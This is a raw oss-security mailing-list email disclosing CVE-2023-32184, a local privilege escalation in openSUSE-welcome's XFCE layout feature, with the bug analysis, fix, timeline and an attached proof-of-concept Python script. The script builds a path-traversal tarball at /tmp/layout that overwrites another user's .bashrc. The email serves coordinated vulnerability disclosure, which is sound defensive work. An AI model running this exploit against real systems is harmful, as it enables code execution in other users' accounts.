Received: (qmail 5485 invoked by uid 550); 22 Aug 2023 10:49:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5452 invoked from network); 22 Aug 2023 10:49:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1692701345; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=Q8pwigXl8CnQ5OFo+z0c/6bPEq5k64WZXDBhXWXzTrE=;
	b=D2aBnzpmFZ4tmZL2KrQcHpyA2exPEZzK0RuOubiYlUFxh9WDYheYHie6WFrUUYMulZVM2t
	bCcULbTWOcCQNadUAo4+eLmS4Ii7U+VVuE/Ic4GEyYB8wzenl03SSn666KVv/V/TI90rEV
	e47Z/Mp7aTaC9Q/BexJ/vf81hccMnfw=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1692701345;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=Q8pwigXl8CnQ5OFo+z0c/6bPEq5k64WZXDBhXWXzTrE=;
	b=IJspiBfvXhmOcUShkKVQxEurwMhXjYlxNNdikHoa01iCKkeaL6gQC/CZSCp77fZT4IhOfK
	WMmpNxISqXKs/YBg==
Date: Tue, 22 Aug 2023 12:49:03 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <ZOSSoKtF9YjXNKeP@kasco.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="0kG6aeM16wSe3Dod"
Content-Disposition: inline
Subject: [oss-security] openSUSE-welcome: local privilege escalation when choosing XFCE
 desktop layout (CVE-2023-32184)

--0kG6aeM16wSe3Dod
Content-Type: multipart/mixed; protected-headers=v1;
	boundary="Ckb7qti63o+PIhtd"
Content-Disposition: inline
Date: Tue, 22 Aug 2023 12:49:03 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Subject: openSUSE-welcome: local privilege escalation when choosing XFCE
 desktop layout (CVE-2023-32184)


--Ckb7qti63o+PIhtd
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this report is about a local privilege escalation in the openSUSE-welcome [=
1]
dialog. Please find the full report below.

Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

openSUSE-welcome is a small Qt program that is autostarted the
first time a user performs a graphical login. It presents various
documentation and communication resources for the openSUSE distribution.

A peculiarity of the program is that when it is running in an XFCE desktop
environment (`$XDG_CURRENT_DESKTOP` environment variable set to `xfce`), th=
en
also a "customise" button is shown which allows to select between different
XFCE desktop layout presets.

There exists a local privilege escalation issue in this component of
openSUSE-welcome that might allow other local users to execute code in the
context of the user that selects a different XFCE desktop layout using the
openSUSE-welcome dialog.

The Vulnerability
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

openSUSE-welcome contains only little C++ source code but relies on a couple
of advanced Qt features like QML descriptions that are used to model the
dialog. Due to this, understanding the setup of the XFCE specific customise
button is not straightforward. To understand the vulnerability, though, it =
is
sufficient to look at the relevant logic that is executed upon button press=
 in
the `PanelLayouter` C++ class.

In `PanelLayouter::applyLayout()` [3] the fixed path "/tmp/layout" is used =
to
store a tarball containing XFCE configuration files:

    void PanelLayouter::applyLayout(const QString &path)
    {
        if (QFile::exists("/tmp/layout"))
            QFile::remove("/tmp/layout");
=20=20=20=20
        QFile layout(path);
        layout.copy("/tmp/layout");
=20=20=20=20
        QProcess::startDetached("/usr/bin/python3", {"-c", m_script});
    }

The `path` passed to this function is not an actual file system path, but
refers to a "Qt Resource" file embedded into the openSUSE-welcome applicati=
on,
that is transparently dealt with by the Qt framework libraries. This explai=
ns
the use of a temporary file in this function, to make the data actually
visible for other processes. The tarballs used for this found in the
openSUSE-welcome repository [2].

A Python script embedded into the `PanelLayouter` class (`m_script` member =
[4])
is used to pass the appropriate tarball to the XFCE4 Python module found
in "/usr/share/xfce4-panel-profiles/xfce4-panel-profiles/panelconfig.py". T=
his
module offers an API to send a desktop layout configuration tarball to the
running XFCE desktop via the D-Bus session bus and process it.

The use of the fixed path "/tmp/layout" is problematic security wise in
multiple ways. The system call sequence from the code above looks like this:

    access("/tmp/layout", F_OK)             =3D -1 ENOENT (No such file or =
directory)
    openat(AT_FDCWD, "/tmp", O_RDWR|O_CLOEXEC|O_TMPFILE, 0600) =3D 55
    linkat(AT_FDCWD, "/proc/self/fd/55", AT_FDCWD, "/tmp/layout", AT_SYMLIN=
K_FOLLOW) =3D 0
    chmod("/tmp/layout", 0444)              =3D 0

This of course offers attack surface involving symlink attacks. If the
Linux kernel's symlink protection is off, other users can place symlinks he=
re
to confuse the existence check or to overwrite arbitrary locations (the
`linkat()` call explicitly specifies `AT_SYMLINK_FOLLOW`). By default on
openSUSE we do have symlink protection, however, so this will be thwarted.

What happens if "/tmp/layout" already exists as a regular file, though? The
code above does not perform any error checks. This means a failing
`QFile::remove()` or `QFile.copy()` is not acted upon and the program logic
continues. The result of this will be, if "/tmp/layout" is already existing
and readable, that attacker controlled data is used in the embedded Python
script.

Impact / Exploiting the Issue
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D

When looking at the logic found in the "panelconfig.py" Python module
one can see that the tarball that is expected as input is supposed to conta=
in
configuration files according to certain name patterns. Among other the scr=
ipt
copies any `*.rc` files found in the tarball into the user's home directory.
The module does have quite some verification logic, but it is contains enou=
gh
loopholes to allow to construct a crafted tarball that causes an arbitrary
file in the user's home directory to be overwritten by attacker controlled
data.

The attached `hack_welcome.py` script is a PoC I wrote that demonstrates th=
is,
by replacing the victim user's ".bashrc" file. The impact is arbitrary code
execution in the context of the victim user that runs XFCE, clicks customize
in openSUSE-welcome dialog and chooses one of the layouts. Refer to the PoC
inline documentation for more details.

The only limitation is that the name of the victim's user account needs to =
be
known in advance. I suspect there are further attack vectors to make this e=
ven
simpler. I did not look into the XFCE logic that processes the configuration
received via the session D-Bus. It may be possible to achieve code execution
through a crafted valid XFCE configuration as well, e.g. via harmful
`.desktop` files.

Affectedness
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

All currently maintained versions of openSUSE have been affected by this
issue, but received updates in the meantime. Historically, openSUSE releases
dating back to at least openSUSE Leap 15.2 are affected.

Bugfix
=3D=3D=3D=3D=3D=3D

Via commit 3c344ad7 [5] the `PanelLayouter` class is changed so that the
input tarball which is actually a Qt resource file is written to a safely
created `QTemporaryFile` instead. Also the embedded Python script is turned
into a dedicated script that is placed on the file system instead.

Updates for the openSUSE-welcome package that contain this bugfix are
available for openSUSE Tumbleweed and openSUSE Leap 15.4 / 15.5.

CVE Assignment
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

openSUSE-welcome is SUSE owned code, so we assigned CVE-2023-32184 for this
issue.

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2023-07-14: I noticed the use of a fixed temporary path in opensuse-welcome
            and decided to investigate it further.
2023-07-26: I started looking into the security impact and exploit
            possibilities which resulted in the PoC attached to this report.
2023-07-27: I started a security fix process [6] for the openSUSE-welcome p=
ackage.
2023-07-28: The CVE was assigned for the issue.
2023-08-01: As there was no dedicated maintainer for openSUSE-welcome
            available I developed a fix for this issue myself [7].
2023-08-11: After some delays and peer reviews the fix was merged into the
            github repository.
2023-08-18: Updates with the bugfix for all maintained openSUSE distributio=
ns
            have become available by now.
2023-08-22: Publication of all vulnerability details.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://github.com/openSUSE/openSUSE-welcome
[2]: https://github.com/openSUSE/openSUSE-welcome/tree/v0.1.9/data/qrc/layo=
uts
[3]: https://github.com/openSUSE/openSUSE-welcome/blob/v0.1.9/src/panellayo=
uter.cpp#L38
[4]: https://github.com/openSUSE/openSUSE-welcome/blob/v0.1.9/src/panellayo=
uter.cpp#L7
[5]: https://github.com/openSUSE/openSUSE-welcome/commit/3c344ad7f71d9b67fa=
8299bfeb3641f5f5d9e6d7
[6]: https://bugzilla.suse.com/show_bug.cgi?id=3D1213708
[7]: https://github.com/openSUSE/openSUSE-welcome/pull/32

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev, Andrew McDonald, Werner Knoblich

--Ckb7qti63o+PIhtd
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="hack_welcome.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
from io import BytesIO
import argparse
import os
import sys
import tarfile

# Matthias Gerstner <matthias.gerstner@suse.com>
# 2023-07-27
#
# Proof of concept (PoC) that shows a vulnerability in the openSUSE-welcome=
 dialog.
#
# When running on XFCE the welcome dialog will offer a "customise" button
# to change the desktop layout for XFCE.
#
# The change logic behind this uses a fixed /tmp file path in /tmp/layout.
# If the file already exists and is readable then the dialog will reuse it,
# even if controlled by a different user.
#
# The file content needs to be tarball that contains files of a certain
# structure. The XFCE script /usr/share/xfce4-panel-profiles/xfce4-panel-pr=
ofiles/panelconfig.py
# will process this tarball via PanelConfig.from_file() and the welcome dia=
log
# then causes PanelConfig.to_xfconf() to be called. See "panellayouter.cpp"=
 in
# openSUSE-welcome.
#
# What this PoC attempts to achieve is that a file from the tarball is copi=
ed to
# an arbitrary location in the victim user's context. This is possible when
# overcoming some hurdles that are checked in the panelconfig.py script.
#
# To use this reproducer perform the following steps:
#
# - create (or have available) a user account acting as the victim that logs
#   into XFCE4. Suppose this account is named 'victim'.
# - login to an attacker account e.g. as nobody, and run this exploit scrip=
t,
#   passing the victim's account name.
#       root # sudo -u nobody -g nobody /bin/bash
#       nobody $ /path/to/hack_welcome.py victim
#   this will precreate a crafted /tmp/layout tarball file for use by
#   openSUSE-welcome.
# - now as the victim user, in an XFCE4 graphical session, run openSUSE-wel=
come,
#   click customise, and then any of the offered desktop layouts.
# - on success, when opening a terminal as the victim user, the overwritten
#   .bashrc file should trigger and you should see the line "you have been
#   hacked" printed.

parser =3D argparse.ArgumentParser()
parser.add_argument("account", help=3D"name of the user account to hack")

args =3D parser.parse_args()

if not os.path.isdir(f"/home/{args.account}"):
    print(args.account, "has no home?", file=3Dsys.stderr)
    sys.exit(1)

try:
    # We want to achieve that the panelconfig.py script thinks it is copyin=
g a
    # *.rc file from the tarball into the XFCE configuration of the home
    # directory.
    #
    # In find_rc_files() there is a check for `if filename.find('.rc) > -1`
    #
    # We will make this check succeed by constructing a path that goes thro=
ugh
    # '/tmp/.rc'.
    #
    # We could overcome this limitation by overwriting an actual *.rc file =
in
    # the user's home directory to execute code. There might exist some such
    # file that is suitable, but for the purposes of this PoC we go this ro=
ute
    # and try to overwrite arbitrarily named files.
    os.mkdir("/tmp/.rc")
except FileExistsError:
    pass

# pre-create a crafted layout tarball
# if this file already exists from another user then the exploit is not pos=
sible
t =3D tarfile.open("/tmp/layout", 'w')

# construct a config.txt file which will control further code paths in
# panelconfig.py
#
# we need to make panelconfig.py create the XFCE configuration directory in
# the user's home, otherwise our crafted path below will fail because of
# missing directory elements.
#
# the necessary `mkdir` is found in panelconfig.py to_xfconf(). It is only
# triggered if a valid desktop configuration is found though. So offer that.
sio =3D BytesIO()
sio.write(b"/panels/panel-0/plugin-ids [<0>]\n")
sio.write(b"/plugins/plugin-0 'launcher'\n")
sio.write(b"/plugins/plugin-0/items ['stuff.desktop']\n")
info =3D tarfile.TarInfo(name=3D"config.txt")
info.size =3D len(sio.getvalue())
sio.seek(0)
t.addfile(tarinfo=3Dinfo, fileobj=3Dsio)

# For the desktop configuration to pass validation we need to actually ship
# a *.desktop file in the tarball that also points to a valid executable.
#
# This aspect actually might be used as an exploit vector on its own, but
# I didn't want to dive too deep into the XFCE plugin architecture for this.
#
# This /tmp/hack.py will not actually be executed via this exploit, but mig=
ht
# very well be in reach to be executed if done properly for XFCE to run it.
exec_path =3D "/tmp/hack.py"
with open(exec_path, 'w') as f:
    f.write("/usr/bin/python3\nprint('you have been hacked\n')")
sio =3D BytesIO()
sio.write(b"[Desktop Entry]\n")
sio.write(f"Exec =3D {exec_path}\n".encode())
sio.seek(0)
info =3D tarfile.TarInfo(name=3D"launcher-0/stuff.desktop")
info.size =3D len(sio.getvalue())
t.addfile(tarinfo=3Dinfo, fileobj=3Dsio)

# This is the actual exploit file we intend to create
# This shall be written to the victim user's ~/.bashrc
#
# The following crafted path is important. The panelconfig.py script wants =
to
# write the "*.rc" file to $HOME/.config/xfce4/panel.
#
# Considering a default home directory in /home, we need to go up five path
# elements to reach the root of the file system. then we go through /tmp/.rc
# to fulfill the "is a .rc file check". Then we need to enter the user's ho=
me
# again.
#
# This is the only limitation of this exploit, that we need to know the use=
r's
# account name to re-enter its home directory. Otherwise the exploit would =
be
# generic and would hit any user pressing the customize button.
hack =3D f"echo '{args.account} you have been hacked'\n"
sio =3D BytesIO()
sio.write(hack.encode())
sio.seek(0)
info =3D tarfile.TarInfo(name=3Df"../../../../../tmp/.rc/../../home/{args.a=
ccount}/.bashrc")
info.size =3D len(hack)
t.addfile(tarinfo=3Dinfo, fileobj=3Dsio)

t.close()

--Ckb7qti63o+PIhtd--

--0kG6aeM16wSe3Dod
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmTkkp8ACgkQFMQFyXGS
NVM36Q//SdaJod0a5S23zgdccOXzE7jhdZQB8skXL+Pn45ui+ORdaEhDkbdWEXsO
5ZWy7JWmLltqH4CUvkAuz2dukzH4jBycVvUAhMKDbKMU1jiORkqVCsMb8PqxXBs9
A7ZHcp5hxWfSWEvsXmqApUd1NRcyWDb83DZwF0fNqddj6FI8biQFt+MCTF/zwRvr
gohGFh0ujWU8Ijn8bfV6jRwuAzAaJafZtE4TS54nC5EZd2WExc9ZJH4rhk3wZ3KC
o8V4pVchjUQnh/Ll/DmW+kTqDs1lmjKt0UitXfPt0UelUinnULg0J7+YvmI2NOj2
MEFPaCfzvM4mzIdKYMAjCIHXOSOr4Nau4DsQNbOiHIykAxb0UbCW1lwf3pfmmcLP
qaQirbDVYilsOVzGzCjCCm8oQn4Rt2WURsxBhkA62dnEYLclZi2e2L3YXnQV4NgI
2oWcVz6o7+k3SrrOaLFYdtm9Z3LFzgzH8cuOWufjwwcLt0688v3+ukzkdN1Wp77L
dOEsDRLjBn17ZTsvkiNNzrP8F1skbsG7rG5IQ+WAWTIYQ17qiwIS9CGlyKaGxkQF
8s6s21LK4Zj8kXByK+Mc73DckXq7Bm89Ri5iudN0bTKGM3+tc9FbEZZXAudFIzNu
rNSdHf+DR99QE6TqQoaOQUzuuUTvtA2nPpFGEraYSHlz3OBVKVc=
=MAwF
-----END PGP SIGNATURE-----

--0kG6aeM16wSe3Dod--
